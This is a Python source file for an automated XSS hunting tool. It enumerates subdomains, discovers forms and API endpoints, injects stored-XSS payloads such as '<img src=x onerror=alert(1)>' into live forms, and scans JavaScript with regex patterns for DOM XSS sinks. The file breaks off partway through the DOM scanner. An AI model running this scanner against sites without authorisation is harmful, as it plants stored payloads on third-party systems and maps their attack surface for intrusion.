#!/usr/bin/env python3
"""
XSSForge Smart Hunter - Automated Advanced XSS Discovery

Automatically performs:
1. DOM XSS scanning (WAF can't block client-side)
2. POST form discovery and testing
3. Blind XSS injection for stored XSS
4. Subdomain enumeration (dev/staging targets)
5. API endpoint discovery and testing

Usage:
    xssforge hunt -d "target.com" --full
    xssforge hunt -u "https://target.com" --forms --blind-callback "https://your.xss.ht"
"""

import asyncio
import re
import json
import sys
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup

try:
    import httpx
except ImportError:
    httpx = None


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class FormTarget:
    """Discovered HTML form."""
    url: str
    action: str
    method: str
    inputs: list[dict]
    has_text_input: bool = False
    test_both_methods: bool = False  # True if no explicit method, should test GET and POST

    def to_dict(self):
        return {
            "url": self.url,
            "action": self.action,
            "method": self.method,
            "inputs": self.inputs,
            "test_both_methods": self.test_both_methods,
        }


@dataclass
class APIEndpoint:
    """Discovered API endpoint."""
    url: str
    method: str
    params: list[str]
    content_type: str = ""

    def to_dict(self):
        return {
            "url": self.url,
            "method": self.method,
            "params": self.params,
            "content_type": self.content_type,
        }


@dataclass
class DOMSink:
    """DOM XSS sink found in JavaScript."""
    url: str
    sink_type: str
    code_snippet: str
    source: str = ""
    exploitable: bool = False

    def to_dict(self):
        return {
            "url": self.url,
            "sink_type": self.sink_type,
            "source": self.source,
            "exploitable": self.exploitable,
        }


@dataclass
class HuntResult:
    """Results from smart hunting."""
    domain: str
    subdomains: list[str] = field(default_factory=list)
    forms: list[FormTarget] = field(default_factory=list)
    api_endpoints: list[APIEndpoint] = field(default_factory=list)
    dom_sinks: list[DOMSink] = field(default_factory=list)
    xss_findings: list[dict] = field(default_factory=list)

    def to_dict(self):
        return {
            "domain": self.domain,
            "subdomains": self.subdomains,
            "forms": [f.to_dict() for f in self.forms],
            "api_endpoints": [a.to_dict() for a in self.api_endpoints],
            "dom_sinks": [d.to_dict() for d in self.dom_sinks],
            "xss_findings": self.xss_findings,
        }


# ============================================================================
# Subdomain Discovery
# ============================================================================

COMMON_SUBDOMAINS = [
    # Development/Staging (HIGH PRIORITY - often less protected)
    "dev", "development", "staging", "stage", "stg", "uat", "test", "testing",
    "qa", "quality", "sandbox", "demo", "preview", "beta", "alpha", "canary",
    "preprod", "pre-prod", "pre", "internal", "int", "local",

    # API endpoints (often lack WAF rules)
    "api", "api2", "api3", "apiv2", "api-v2", "rest", "graphql", "gql",
    "gateway", "backend", "service", "services", "microservice",

    # Admin/Management (high value)
    "admin", "administrator", "manage", "management", "portal", "dashboard",
    "console", "panel", "control", "cms", "backoffice", "back-office",

    # Auth endpoints
    "auth", "login", "signin", "sso", "oauth", "identity", "id", "accounts",
    "account", "user", "users", "member", "members", "profile",

    # CDN/Assets (sometimes misconfigured)
    "cdn", "static", "assets", "media", "images", "img", "files", "uploads",
    "content", "resources", "js", "css",

    # Common services
    "mail", "email", "smtp", "webmail", "mx", "pop", "imap",
    "ftp", "sftp", "ssh", "vpn", "remote",
    "db", "database", "mysql", "postgres", "mongo", "redis", "cache",
    "search", "elastic", "elasticsearch", "solr",
    "chat", "support", "help", "helpdesk", "ticket", "tickets",
    "blog", "news", "press", "community", "forum", "forums",
    "shop", "store", "cart", "checkout", "payment", "payments", "pay",
    "app", "apps", "mobile", "m", "wap",
    "www", "www2", "www3", "web", "web2",
]


async def enumerate_subdomains(
    client: "httpx.AsyncClient",
    domain: str,
    verbose: bool = False
) -> list[str]:
    """
    Enumerate subdomains using multiple methods.

    1. Common subdomain wordlist
    2. Certificate transparency (crt.sh)
    """
    found = set()

    if verbose:
        print(f"[HUNT] Enumerating subdomains for {domain}...", file=sys.stderr)

    # Method 1: Common subdomains bruteforce
    tasks = []
    for sub in COMMON_SUBDOMAINS[:50]:  # Limit for speed
        subdomain = f"{sub}.{domain}"
        tasks.append(check_subdomain(client, subdomain))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for subdomain, exists in [(f"{COMMON_SUBDOMAINS[i]}.{domain}", r)
                               for i, r in enumerate(results) if not isinstance(r, Exception)]:
        if exists:
            found.add(subdomain)
            if verbose:
                print(f"[SUBDOMAIN] Found: {subdomain}", file=sys.stderr)

    # Method 2: Certificate Transparency
    try:
        r = await client.get(
            f"https://crt.sh/?q=%.{domain}&output=json",
            timeout=15.0
        )
        if r.status_code == 200:
            certs = r.json()
            for cert in certs[:100]:  # Limit results
                name = cert.get("name_value", "")
                for line in name.split("\n"):
                    line = line.strip().lower()
                    if line.endswith(domain) and "*" not in line:
                        found.add(line)
    except:
        pass

    return sorted(found)


async def check_subdomain(client: "httpx.AsyncClient", subdomain: str) -> bool:
    """Check if subdomain exists."""
    try:
        r = await client.head(f"https://{subdomain}", timeout=5.0)
        return r.status_code < 500
    except:
        try:
            r = await client.head(f"http://{subdomain}", timeout=5.0)
            return r.status_code < 500
        except:
            return False


# ============================================================================
# Form Discovery
# ============================================================================

async def discover_forms(
    client: "httpx.AsyncClient",
    url: str,
    verbose: bool = False
) -> list[FormTarget]:
    """
    Discover HTML forms on a page.

    Looks for:
    - Traditional <form> elements
    - JavaScript-generated forms
    - Input fields outside forms
    """
    forms = []

    try:
        r = await client.get(url, follow_redirects=True)
        if r.status_code != 200:
            return forms

        soup = BeautifulSoup(r.text, "lxml")
        base_url = str(r.url)

        # Find all forms
        for form in soup.find_all("form"):
            action = form.get("action", "")
            if action:
                action = urljoin(base_url, action)
            else:
                action = base_url

            # Forms without explicit method: default is GET, but also mark for POST testing
            raw_method = form.get("method")
            method = (raw_method or "GET").upper()
            # If no method specified, we should test both GET and POST (for stored XSS)
            no_explicit_method = raw_method is None

            inputs = []
            has_text = False

            for inp in form.find_all(["input", "textarea", "select"]):
                inp_name = inp.get("name") or inp.get("id")
                inp_type = inp.get("type", "text")
                inp_value = inp.get("value", "")

                if inp_name:
                    inputs.append({
                        "name": inp_name,
                        "type": inp_type,
                        "value": inp_value,
                    })

                    if inp_type in ("text", "search", "email", "url", "tel", "textarea"):
                        has_text = True

            if inputs:
                forms.append(FormTarget(
                    url=base_url,
                    action=action,
                    method=method,
                    inputs=inputs,
                    has_text_input=has_text,
                    test_both_methods=no_explicit_method,  # Test POST too if no method specified
                ))

                if verbose:
                    method_note = " (will test POST too)" if no_explicit_method else ""
                    print(f"[FORM] {method} {action} ({len(inputs)} inputs){method_note}", file=sys.stderr)

        # Also find standalone inputs (might be JS-handled)
        standalone_inputs = soup.find_all("input", {"name": True})
        for inp in standalone_inputs:
            if not inp.find_parent("form"):
                # Input outside form - might be AJAX
                inp_name = inp.get("name")
                if verbose:
                    print(f"[INPUT] Standalone: {inp_name}", file=sys.stderr)

    except Exception as e:
        if verbose:
            print(f"[ERROR] Form discovery: {e}", file=sys.stderr)

    return forms


# ============================================================================
# Stored XSS Testing
# ============================================================================

STORED_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'>"><img src=x onerror=alert(1)>',
]


async def test_stored_xss(
    client: "httpx.AsyncClient",
    form: FormTarget,
    verbose: bool = False
) -> list[dict]:
    """
    Test a form for stored XSS vulnerabilities.

    1. Submit form with XSS payloads via POST
    2. Reload the page
    3. Check if payload is reflected (stored)

    Returns list of XSS findings.
    """
    findings = []

    # Only test forms with text inputs
    if not form.has_text_input:
        return findings

    # Find text input names
    text_inputs = [inp["name"] for inp in form.inputs
                   if inp.get("type", "text") in ("text", "textarea", "email", "search", "url")]

    if not text_inputs:
        return findings

    for payload in STORED_XSS_PAYLOADS:
        # Build form data
        data = {}
        for inp in form.inputs:
            if inp["name"] in text_inputs:
                data[inp["name"]] = payload
            elif inp.get("value"):
                data[inp["name"]] = inp["value"]
            else:
                data[inp["name"]] = "test"

        try:
            # Submit via POST
            if verbose:
                print(f"[STORED] Testing POST to {form.action} with payload: {payload[:30]}...", file=sys.stderr)

            await client.post(form.action, data=data, follow_redirects=True)

            # Wait a bit for the data to be stored
            await asyncio.sleep(0.3)

            # Reload the original page to check if payload is stored
            check_response = await client.get(form.url, follow_redirects=True)

            # Check if payload is reflected (unencoded = XSS)
            if payload in check_response.text:
                finding = {
                    "type": "stored_xss",
                    "url": form.url,
                    "form_action": form.action,
                    "method": "POST",
                    "param": text_inputs[0],
                    "payload": payload,
                    "severity": "critical",
                    "evidence": f"Payload stored and reflected unencoded in page",
                }
                findings.append(finding)

                if verbose:
                    print(f"[STORED-XSS] FOUND! {form.url} via {form.action}", file=sys.stderr)

                # One finding per form is enough
                break

            # Check for partial reflection (encoded but still dangerous)
            import html
            if html.escape(payload) not in check_response.text and payload.replace("<", "&lt;") not in check_response.text:
                # Payload not even HTML-encoded - might be filtered
                pass

        except Exception as e:
            if verbose:
                print(f"[STORED] Error testing {form.action}: {e}", file=sys.stderr)

        await asyncio.sleep(0.2)  # Rate limit

    return findings


# ============================================================================
# API Endpoint Discovery
# ============================================================================

API_PATTERNS = [
    # REST patterns
    r'/api/v\d+/',
    r'/api/',
    r'/rest/',
    r'/graphql',
    r'/v\d+/',

    # Common endpoints
    r'/users?/',
    r'/auth/',
    r'/login',
    r'/search',
    r'/query',
    r'/data/',
    r'/ajax/',
    r'/json/',
    r'/xml/',
]

async def discover_api_endpoints(
    client: "httpx.AsyncClient",
    url: str,
    verbose: bool = False
) -> list[APIEndpoint]:
    """
    Discover API endpoints from:
    1. JavaScript files
    2. HTML data attributes
    3. Common patterns
    """
    endpoints = []
    found_urls = set()

    try:
        r = await client.get(url, follow_redirects=True)
        if r.status_code != 200:
            return endpoints

        soup = BeautifulSoup(r.text, "lxml")
        base_url = str(r.url)
        parsed = urlparse(base_url)
        base_domain = f"{parsed.scheme}://{parsed.netloc}"

        # Extract from JavaScript
        js_urls = []

        # Inline scripts
        for script in soup.find_all("script"):
            if script.string:
                js_urls.extend(extract_urls_from_js(script.string, base_domain))

        # External scripts
        for script in soup.find_all("script", src=True):
            src = script.get("src")
            if src:
                js_url = urljoin(base_url, src)
                try:
                    js_r = await client.get(js_url, timeout=10.0)
                    if js_r.status_code == 200:
                        js_urls.extend(extract_urls_from_js(js_r.text, base_domain))
                except:
                    pass

        # Filter for API-like URLs
        for api_url in js_urls:
            if api_url in found_urls:
                continue
            found_urls.add(api_url)

            # Check if it matches API patterns
            is_api = any(re.search(pat, api_url) for pat in API_PATTERNS)
            if is_api or "/api" in api_url.lower():
                # Extract query params
                parsed_api = urlparse(api_url)
                params = list(parse_qs(parsed_api.query).keys())

                endpoints.append(APIEndpoint(
                    url=api_url,
                    method="GET",  # Assume GET, will test POST too
                    params=params,
                ))

                if verbose:
                    print(f"[API] Found: {api_url}", file=sys.stderr)

        # Also check for data attributes
        for elem in soup.find_all(attrs={"data-url": True}):
            data_url = elem.get("data-url")
            if data_url and data_url not in found_urls:
                found_urls.add(data_url)
                api_url = urljoin(base_url, data_url)
                endpoints.append(APIEndpoint(
                    url=api_url,
                    method="GET",
                    params=[],
                ))

    except Exception as e:
        if verbose:
            print(f"[ERROR] API discovery: {e}", file=sys.stderr)

    return endpoints


def extract_urls_from_js(js_code: str, base_domain: str) -> list[str]:
    """Extract URLs from JavaScript code."""
    urls = []

    # Pattern for quoted strings that look like URLs/paths
    patterns = [
        r'"(/[^"]*)"',  # "/path/to/api"
        r"'(/[^']*)'",  # '/path/to/api'
        r'`(/[^`]*)`',  # `/path/to/api`
        r'"(https?://[^"]*)"',  # Full URLs
        r"'(https?://[^']*)'",
    ]

    for pattern in patterns:
        for match in re.finditer(pattern, js_code):
            path = match.group(1)
            if path.startswith("/"):
                urls.append(base_domain + path)
            elif path.startswith("http"):
                urls.append(path)

    return urls


# ============================================================================
# DOM XSS Scanning
# ============================================================================

# ============================================================================
# DOM XSS Taint Tracking (Proper Flow Analysis)
# ============================================================================

# Sanitization functions that ACTUALLY break XSS taint flow
# Be conservative - only include functions that truly sanitize HTML/JS injection
SANITIZERS = [
    # HTML encoding (prevents tag injection)
    "encodeURIComponent(",  # Must have ( to avoid matching variable names
    "encodeURI(",
    "DOMPurify.sanitize",
    "htmlEncode(",
    "escapeHtml(",
    "escapeHTML(",
    "sanitizeHtml(",
    "xss(",  # xss npm package
    "he.encode(",
    "_.escape(",  # Lodash escape

    # Safe DOM methods (output as text, not HTML)
    ".textContent =",
    ".innerText =",
    "createTextNode(",

    # These do NOT sanitize XSS - removed:
    # "parseInt", "parseFloat" - only sanitize if DIRECTLY wrapping the sink input
    # "JSON.parse/stringify" - doesn't prevent XSS in all cases
    # "escape" - deprecated, doesn't sanitize HTML
    # "btoa/atob" - just encoding, doesn't sanitize
]

# Patterns that indicate ACTUAL exploitable flows (not just proximity)
# These regex patterns match real source->sink data flow
EXPLOITABLE_PATTERNS = [
    # Direct sink assignments from location
    (r'\.innerHTML\s*=\s*[^;]*location\.(hash|search|href)', "innerHTML = location", "critical"),
    (r'\.outerHTML\s*=\s*[^;]*location\.(hash|search|href)', "outerHTML = location", "critical"),
    (r'document\.write\s*\([^)]*location\.(hash|search|href)', "document.write(location)", "critical"),
    (r'eval\s*\([^)]*location\.(hash|search|href)', "eval(location)", "critical"),
    (r'setTimeout\s*\([^,)]*location\.(hash|search|href)', "setTimeout(location) as code", "critical"),
    (r'setInterval\s*\([^,)]*location\.(hash|search|href)', "setInterval(location) as code", "critical"),
    (r'Function\s*\([^)]*location\.(hash|search|href)', "Function(location)", "critical"),

    # jQuery sinks with location
    (r'\$\([^)]*\)\.html\s*\([^)]*location\.(hash|search|href)', "$.html(location)", "critical"),
    (r'\$\([^)]*\)\.append\s*\([^)]*location\.(hash|search|href)', "$.append(location)", "high"),
    (r'\$\([^)]*location\.(hash|search)', "$(location) - jQuery selector injection", "critical"),

    # URL/redirect sinks
    (r'location\s*=\s*[^;]*location\.(hash|search)', "location = location.hash (open redirect)", "medium"),
    (r'location\.href\s*=\s*[^;]*location\.(hash|search)', "location.href = location (redirect)", "medium"),
    (r'location\.replace\s*\([^)]*location\.(hash|search)', "location.replace(location)", "medium"),
    (r'window\.open\s*\([^)]*location\.(hash|search|href)', "window.open(location)", "medium"),

    # Custom URL parsing -> sink (Level 11 pattern)
    # Pattern: location.href parsed into object/array, then used in document.write/innerHTML
    (r'location\.href[\s\S]{0,300}split[\s\S]{0,500}document\.write', "location.href parsing -> document.write", "critical"),
    (r'location\.href[\s\S]{0,300}split[\s\S]{0,500}\.innerHTML', "location.href parsing -> innerHTML", "critical"),
    (r'location\.href[\s\S]{0,300}queryDict[\s\S]{0,200}document\.write', "location.href -> queryDict -> document.write", "critical"),
    (r'decodeURIComponent\s*\([^)]*\w+\.\w+\s*\)[\s\S]{0,100}document\.write', "decodeURIComponent(obj.prop) -> document.write", "critical"),
    (r'decodeURIComponent[\s\S]{0,100}document\.write', "decodeURIComponent -> document.write", "critical"),

    # postMessage without origin check (look for data used in sink)
    (r'addEventListener\s*\(\s*["\']message["\'][^}]*\.innerHTML\s*=\s*[^;]*\.data', "postMessage -> innerHTML", "critical"),
    (r'addEventListener\s*\(\s*["\']message["\'][^}]*eval\s*\([^)]*\.data', "postMessage -> eval", "critical"),
    (r'onmessage\s*=\s*[^}]*\.innerHTML\s*=\s*[^;]*\.data', "onmessage -> innerHTML", "critical"),

    # document.referrer (less common but exploitable)
    (r'\.innerHTML\s*=\s*[^;]*document\.referrer', "innerHTML = document.referrer", "high"),
    (r'eval\s*\([^)]*document\.referrer', "eval(document.referrer)", "critical"),

    # window.name (cross-origin data)
    (r'\.innerHTML\s*=\s*[^;]*window\.name', "innerHTML = window.name", "critical"),
    (r'eval\s*\([^)]*window\.name', "eval(window.name)", "critical"),

    # localStorage/sessionStorage (persistent XSS)
    (r'\.innerHTML\s*=\s*[^;]*localStorage\.getItem', "innerHTML = localStorage", "high"),
    (r'\.innerHTML\s*=\s*[^;]*sessionStorage\.getItem', "innerHTML = sessionStorage", "high"),
    (r'eval\s*\([^)]*localStorage\.getItem', "eval(localStorage)", "critical"),

    # ===== CLIENT-SIDE STORAGE XSS (Level 2 pattern) =====
    # Pattern: innerHTML with data from DB/array (e.g., posts[i].message)
    # These are DOM-based stored XSS where user input is stored client-side
    (r'\.innerHTML\s*\+=\s*[^;]*\w+\[\w+\]\.\w+', "innerHTML += array[i].property (client-side stored)", "critical"),
    (r'\.innerHTML\s*=\s*[^;]*\w+\[\w+\]\.\w+', "innerHTML = array[i].property (client-side stored)", "critical"),
    (r'\.innerHTML\s*\+=\s*[^;]*\.message', "innerHTML += .message (user content)", "critical"),
    (r'\.innerHTML\s*\+=\s*[^;]*\.content', "innerHTML += .content (user content)", "critical"),
    (r'\.innerHTML\s*\+=\s*[^;]*\.text', "innerHTML += .text (user content)", "high"),
    (r'\.innerHTML\s*\+=\s*[^;]*\.body', "innerHTML += .body (user content)", "high"),
    # Form -> save -> display pattern (Level 2 exact pattern)
    (r'\.save\s*\([^)]*\)[\s\S]{0,500}\.innerHTML\s*\+=', "DB.save() + innerHTML += (stored XSS)", "critical"),
    (r'getPosts[\s\S]{0,500}\.innerHTML\s*\+=', "getPosts() + innerHTML += (stored XSS)", "critical"),

    # ===== URL CONSTRUCTION PATTERNS (Analytics/Logging XSS) =====
    # Pattern: Functions that build URLs with user input - common in analytics/tracking
    # Example: log_access("http://site.com?param=" + input)
    (r'(?:log|track|send|report|analytics|record|save_event|event_track|ga|gtag|_gaq)\s*\([^)]*["\']https?://[^"\']*\?[^"\']*["\']\s*\+', "analytics/log function with URL construction", "high"),
    (r'(?:log_access|track_event|send_analytics)\s*\([^)]*["\']https?://', "logging function with URL (potential param injection)", "medium"),

    # Generic URL construction with concat - detects: func("url?x=" + var)
    (r'\w+\s*\([^)]*["\']https?://[^"\']*\?[^"\']*["\']\s*\+\s*\w+', "function call with URL param concatenation", "high"),
    (r'["\']https?://[^"\']*\?[^"\']*["\']\s*\+\s*(?:location\.|window\.|document\.)', "URL construction with DOM property", "critical"),

    # URL building patterns with multiple params
    (r'["\']https?://[^"\']*["\']\s*\+\s*[^;]*\+\s*["\']&', "URL with multiple params constructed", "medium"),
    (r'(?:url|link|href|src)\s*=\s*[^;]*["\']https?://[^"\']*["\']\s*\+', "URL variable assignment with concatenation", "medium"),
    # Two-step flow: variable contains user data, then innerHTML uses variable
    # Pattern: html += posts[i].message ... innerHTML += html (Level 2 exact)
    (r'(\w+)\s*\+=\s*[^;]*\[\w+\]\.(?:message|content|text|body|data)[^;]*;[\s\S]{0,200}\.innerHTML\s*\+=\s*[^;]*\1', "var += array.message; innerHTML += var (client-side stored)", "critical"),
    (r'(\w+)\s*\+=\s*[^;]*posts\[\w+\][\s\S]{0,200}\.innerHTML\s*\+=\s*[^;]*\1', "var += posts[i]; innerHTML += var (stored XSS)", "critical"),
    # Direct detection of user input -> storage -> display pattern
    (r'getElementById\([^)]*\)\.value[\s\S]{0,500}\.save\([\s\S]{0,500}\.innerHTML', "form.value -> save() -> innerHTML (stored DOM XSS)", "critical"),

    # Variable assignment then sink (two-step flow)
    (r'(\w+)\s*=\s*location\.(hash|search)[^;]*;[^;]{0,100}\.innerHTML\s*=\s*[^;]*\1', "var = location; innerHTML = var", "critical"),
    (r'(\w+)\s*=\s*location\.(hash|search)[^;]*;[^;]{0,100}eval\s*\([^)]*\1', "var = location; eval(var)", "critical"),

    # URL parameter extraction then sink
    (r'URLSearchParams[^;]*\.get\s*\([^)]*\)[^;]{0,50}\.innerHTML\s*=', "URLSearchParams.get -> innerHTML", "high"),
    (r'\.split\s*\([^)]*[&=][^)]*\)[^;]{0,100}\.innerHTML\s*=', "URL param split -> innerHTML", "high"),

    # Hash routing patterns (common in SPAs)
    (r'location\.hash\.(?:slice|substr|substring)\s*\([^)]*\)[^;]{0,50}\.innerHTML', "hash routing -> innerHTML", "high"),
    (r'location\.hash\.replace\s*\([^)]*\)[^;]{0,50}\.innerHTML', "hash.replace -> innerHTML", "high"),

    # ===== MULTI-STEP FLOWS (function calls, string concat) =====

    # Function called with location.hash that uses .html() internally
    # Pattern: function(x) { .html(x) } ... func(location.hash)
    (r'function\s*\w*\s*\([^)]*\)\s*\{[^}]{0,300}\.html\s*\([^)]*\)[^}]*\}[^;]{0,500}location\.hash', "function(.html) called with location.hash", "high"),

    # LEVEL 3 PATTERN: unescape + self.location.hash + function call + .html() in same script
    # Pattern: unescape(self.location.hash...) in script that also has .html() sink
    # This catches indirect flows through function parameters
    (r'unescape\s*\([^)]*(?:self\.)?location\.hash[\s\S]{0,1000}\.html\s*\(', "unescape(location.hash) + .html() in same script", "critical"),
    (r'\.html\s*\([\s\S]{0,1000}unescape\s*\([^)]*(?:self\.)?location\.hash', ".html() + unescape(location.hash) in same script", "critical"),

    # Named function with .html() called with location.hash argument
    # Pattern: function name(...) { ... .html(...) ... } ... name(unescape(location.hash))
    (r'function\s+(\w+)\s*\([^)]*\)[\s\S]{0,500}\.html\s*\([\s\S]{0,2000}\1\s*\([^)]*(?:self\.)?location\.hash', "function with .html() called with location.hash arg", "critical"),

    # String concatenation into HTML then .html() - any position in script
    (r'["\'][^"\']*<\s*\w+[^"\']*["\']\s*\+[\s\S]{0,500}\.html\s*\([\s\S]{0,1000}(?:self\.)?location\.hash', "HTML string concat + .html() + location.hash", "critical"),

    # unescape/decodeURI with location.hash then sink
    (r'unescape\s*\([^)]*location\.hash', "unescape(location.hash) - XSS via hash", "high"),
    (r'unescape\s*\([^)]*self\.location\.hash', "unescape(self.location.hash) - XSS via hash", "critical"),
    (r'decodeURI(?:Component)?\s*\([^)]*location\.hash', "decodeURI(location.hash) - XSS via hash", "high"),
    (r'decodeURI(?:Component)?\s*\([^)]*self\.location\.hash', "decodeURI(self.location.hash) - XSS via hash", "critical"),

    # String concatenation with location.hash then .html()
    # Pattern: var x = "..." + location.hash + "..."; .html(x)
    (r'["\'][^"\']*["\']\s*\+\s*[^;]*location\.hash[^;]*;[^;]{0,200}\.html\s*\(', "string + location.hash -> .html()", "critical"),

    # jQuery .html() with any variable that came from location.hash in same scope
    (r'location\.hash[^;]{0,300}\.html\s*\(', "location.hash flows to .html()", "high"),

    # Self/this.location patterns (iframes)
    (r'self\.location\.hash[^;]{0,200}\.html', "self.location.hash -> .html()", "critical"),
    (r'self\.location\.hash[^;]{0,200}\.innerHTML', "self.location.hash -> innerHTML", "critical"),

    # Common vulnerable pattern: onload with location.hash
    (r'onload\s*=\s*[^;]*location\.hash', "onload handler uses location.hash", "high"),
    (r'window\.onload[^}]{0,300}location\.hash[^}]{0,300}\.html', "window.onload: location.hash -> .html()", "critical"),

    # img src with location.hash (can lead to XSS via onerror)
    (r'<img[^>]*src[^>]*["\'][^"\']*\+[^"\']*location\.hash', "img src with location.hash concatenation", "high"),
    (r'\.src\s*=\s*[^;]*location\.hash', ".src = location.hash", "medium"),

    # document.getElementById().innerHTML with tainted data
    (r'getElementById\s*\([^)]*\)\s*\.innerHTML\s*=\s*[^;]*location', "getElementById.innerHTML = location", "critical"),
    (r'querySelector\s*\([^)]*\)\s*\.innerHTML\s*=\s*[^;]*location', "querySelector.innerHTML = location", "critical"),

    # ===== SCRIPT SRC INJECTION (Level 6 style) =====
    # location.hash used to set script src - gadget loading XSS
    (r'createElement\s*\(\s*["\']script["\']\s*\)[^;]{0,200}\.src\s*=\s*[^;]*location\.hash', "createElement('script').src = location.hash", "critical"),
    (r'\.src\s*=\s*[^;]*location\.hash', "script.src = location.hash", "critical"),
    (r'includeGadget\s*\([^)]*location\.hash', "includeGadget(location.hash) - gadget loading", "critical"),
    (r'loadScript\s*\([^)]*location\.hash', "loadScript(location.hash)", "critical"),

    # Script src with URL fragment or query
    (r'<script[^>]*src\s*=\s*["\'][^"\']*location\.hash', "script src with location.hash", "critical"),
    (r'\.setAttribute\s*\(\s*["\']src["\']\s*,\s*[^)]*location\.hash', "setAttribute('src', location.hash)", "critical"),

    # Data URL / javascript: URL injection patterns
    (r'location\.hash[^;]{0,100}data:', "location.hash with data: URL", "high"),
    (r'location\.hash[^;]{0,100}javascript:', "location.hash with javascript: URL", "critical"),

    # Indirect hash usage via function (Level 6 pattern)
    # Pattern: function returns location.hash, then used to load script
    (r'return\s+[^;]*location\.hash[^}]*}[^;]{0,300}(?:includeGadget|loadScript|\.src\s*=)', "function returns location.hash -> script loading", "critical"),
    (r'function\s+\w+\s*\(\s*\)\s*\{[^}]*location\.hash[^}]*\}[^;]{0,200}createElement\s*\(\s*["\']script', "hash function -> createElement script", "critical"),

    # Script element src from any function using hash
    (r'scriptEl\.src\s*=\s*\w+[^;]*location\.hash', "scriptEl.src = func(location.hash)", "critical"),
    (r'createElement\s*\([^)]*script[^)]*\)[^;]{0,100}\.src\s*=\s*\w+\s*\(', "createElement script with dynamic src", "high"),
]

# Patterns that are commonly FALSE POSITIVES (filter these out)
FALSE_POSITIVE_PATTERNS = [
    r'location\.href\s*===',  # Comparison, not assignment
    r'location\.href\s*!==',
    r'location\.href\s*==',
    r'location\.href\s*!=',
    r'if\s*\([^)]*location',  # Conditional check
    r'console\.(log|debug|info|warn|error)\s*\([^)]*location',  # Logging
    r'analytics|tracking|gtag|ga\(',  # Analytics
    r'encodeURIComponent\s*\([^)]*location',  # Properly encoded
    r'JSON\.stringify\s*\([^)]*location',  # Serialized (safe)
]


def _is_sanitized(code_context: str) -> bool:
    """Check if the code context contains sanitization."""
    code_lower = code_context.lower()
    for sanitizer in SANITIZERS:
        if sanitizer.lower() in code_lower:
            return True
    return False


def _is_false_positive(code_context: str) -> bool:
    """Check if the pattern match is a known false positive."""
    for fp_pattern in FALSE_POSITIVE_PATTERNS:
        if re.search(fp_pattern, code_context, re.I):
            return True
    return False


def _analyze_js_for_dom_xss(js_code: str, verbose: bool = False) -> list[tuple]:
    """
    Analyze JavaScript code for actual exploitable DOM XSS flows.

    Returns list of (pattern_name, severity, code_snippet, exploitable)
    """
    findings = []

    # Remove comments to reduce false positives
    js_clean = re.sub(r'//.*$', '', js_code, flags=re.MULTILINE)
    js_clean = re.sub(r'/\*.*?\*/', '', js_clean, flags=re.DOTALL)

    for pattern, name, severity in EXPLOITABLE_PATTERNS:
        matches = re.finditer(pattern, js_clean, re.IGNORECASE | re.DOTALL)
        for match in matches:
            # Get context around the match
            start = max(0, match.start() - 50)
            end = min(len(js_clean), match.end() + 50)
            context = js_clean[start:end]

            # Skip if sanitized
            if _is_sanitized(context):
                if verbose:
                    print(f"[DOM] SKIP (sanitized): {name}", file=sys.stderr)
                continue

            # Skip known false positives
            if _is_false_positive(context):
                if verbose:
                    print(f"[DOM] SKIP (false positive pattern): {name}", file=sys.stderr)
                continue

            # Determine if truly exploitable
            exploitable = severity in ("critical", "high")

            findings.append((name, severity, context.strip()[:150], exploitable))

            if verbose:
                print(f"[DOM] {severity.upper()}: {name}", file=sys.stderr)

    return findings


async def scan_dom_xss(
    client: "httpx.AsyncClient",
    url: str,
    verbose: bool = False
) -> list[DOMSink]:
    """
    Scan for DOM XSS vulnerabilities using proper taint tracking.

    This uses pattern-based flow analysis instead of proximity matching.
    Only reports when there's a clear source->sink data flow.
    """
    sinks_found = []
    seen_patterns = set()  # Deduplicate findings

    try:
        r = await client.get(url, follow_redirects=True, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        if r.status_code != 200:
            return sinks_found

        soup = BeautifulSoup(r.text, "lxml")

        # Collect all JavaScript
        all_js = []

        # Inline scripts (higher priority - often contain vulnerable code)
        for script in soup.find_all("script"):
            if script.string and len(script.string) > 50:
                all_js.append(("inline", script.string))

        # External scripts - prioritize untrusted/interesting domains
        # These domains are more likely to contain vulnerable code
        priority_keywords = ["untrusted", "dev", "staging", "test", "demo", "beta", "alpha",
                             "sandbox", "qa", "uat", "preprod", "analytics", "track", "log"]

        external_scripts = []
        for script in soup.find_all("script", src=True):
            src = script.get("src", "")
            if not src:
                continue

            # Skip common libraries (unlikely to be vulnerable)
            if any(x in src.lower() for x in ["vendor", "polyfill", "jquery", "react", "angular", "vue", "chunk", "webpack", "bootstrap"]):
                continue

            js_url = urljoin(url, src)

            # Prioritize scripts from interesting domains
            priority = 0
            if any(keyword in js_url.lower() for keyword in priority_keywords):
                priority = 2  # High priority
            elif js_url.startswith(urljoin(url, "/")):
                priority = 1  # Same domain - medium priority
            else:
                priority = 0  # External domain - low priority

            external_scripts.append((priority, js_url))

        # Sort by priority (highest first) and fetch
        external_scripts.sort(reverse=True)
        for _, js_url in external_scripts[:15]:  # Limit to 15 external scripts
            try:
                if verbose:
                    print(f"[DOM] Analyzing external script: {js_url[:80]}", file=sys.stderr)
                js_r = await client.get(js_url, timeout=10.0)
                if js_r.status_code == 200 and len(js_r.text) < 500000:  # Skip huge bundles
                    all_js.append((js_url, js_r.text))
                elif verbose and js_r.status_code != 200:
                    print(f"[DOM] External script returned {js_r.status_code}: {js_url[:60]}", file=sys.stderr)
            except Exception as e:
                if verbose:
                    print(f"[DOM] Failed to fetch {js_url[:60]}: {e}", file=sys.stderr)

        # Analyze each JS file with taint tracking
        for source_name, js_code in all_js:
            findings = _analyze_js_for_dom_xss(js_code, verbose)

            for pattern_name, severity, snippet, exploitable in findings:
                # Deduplicate
                key = f"{pattern_name}:{snippet[:50]}"
                if key in seen_patterns:
                    continue
                seen_patterns.add(key)

                # Extract source from pattern name
                source = "location"
                if "postMessage" in pattern_name:
                    source = "postMessage"
                elif "localStorage" in pattern_name:
                    source = "localStorage"
                elif "sessionStorage" in pattern_name:
                    source = "sessionStorage"
                elif "window.name" in pattern_name:
                    source = "window.name"
                elif "referrer" in pattern_name:
                    source = "document.referrer"

                # Include source file info if it's an external script
                sink_description = pattern_name
